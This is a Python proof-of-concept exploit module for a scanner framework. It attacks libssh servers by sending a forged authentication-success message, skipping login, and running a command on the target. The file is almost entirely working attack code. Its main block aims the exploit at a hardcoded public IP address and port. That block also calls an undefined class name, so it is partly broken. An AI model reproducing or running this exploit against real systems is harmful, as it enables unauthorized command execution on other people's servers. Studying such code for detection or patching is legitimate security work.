import YmfPoc
import sys
import paramiko
import socket
import logging


class libssh_connect_verify(YmfPoc.YmfPoc):

    def __init__(self, url):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "sshlib unauth connect",
            "product": "libssh",
            "author": "test",
            "date": "2018/10/19",
            "description": "libssh connection",
        }
        self.options = {
            "url": url,
            "port": 22,
            "Command": "pwd",
        }
        self.result = {
            "status": False,
            "data": "",
            "error": "",
        }

    def verify(self):
        bufsize = 2048
        logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
        sock = socket.socket()
        try:
            sock.connect((self.options['url'], int(self.options['port'])))
            message = paramiko.message.Message()
            transport = paramiko.transport.Transport(sock)
            transport.start_client()

            message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
            transport._send_message(message)

            client = transport.open_session(timeout=10)
            client.exec_command(self.options['Command'])

            # stdin = client.makefile("wb", bufsize)
            stdout = client.makefile("rb", bufsize)
            stderr = client.makefile_stderr("rb", bufsize)

            output = stdout.read()
            error = stderr.read()

            stdout.close()
            stderr.close()

            self.result['status'] = True
            self.result['data'] = (output + error).decode()
        except paramiko.SSHException as e:
            # logging.exception(e)
            # logging.debug("TCPForwarding disabled on remote server can't connect. Not Vulnerable")
            self.result['status'] = False
            self.result['error'] = "TCPForwarding disabled on remote server can't connect. Not Vulnerable."

        except socket.error:
            # logging.debug("Unable to connect.")
            self.result['status'] = False
            self.result['error'] = "Unable to connect."


if __name__ == '__main__':
    # lib = libsshPoc(sys.argv[1], sys.argv[2])
    lib = libsshPoc("178.128.2.97", "2222")
    lib.verify()
    print(lib.result['status'])
    print(lib.result['data'])